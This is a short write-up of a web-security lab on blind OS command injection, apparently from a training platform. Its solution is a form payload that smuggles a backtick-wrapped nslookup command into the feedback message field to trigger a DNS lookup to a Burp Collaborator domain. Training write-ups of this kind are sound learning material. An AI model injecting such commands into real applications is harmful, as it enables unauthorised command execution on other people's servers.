# Lab: Blind OS command injection with out-of-band interaction
## Task
This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

## Solution
On Burp Suite Pro, run a Burp Collaborator client and copy the domain.  

![image](https://user-images.githubusercontent.com/44528004/130431194-b21040cc-8c91-4c79-b4b1-51e0f03d05c3.png)

Next, add this domain to the payload to create an out-of-band interaction.  
```
name=hacker&email=hacker%40hacker.com&subject=hack&message=hack`nslookup rje8b1i3h26hmw1bml2l62lh389yxn.burpcollaborator.net`
```  

Comeback to the Burp Collaborator client, click **Poll now** and see that there are some coming dns queries.  

![image](https://user-images.githubusercontent.com/44528004/130431793-cc7818ab-fa1f-48cc-8b31-70440a1aeaf8.png)

That's also what this lab wants us to do.  

![image](https://user-images.githubusercontent.com/44528004/130431414-8309e4cc-b3ce-4d67-8b6f-91b319aa7b5f.png)
> Solved!
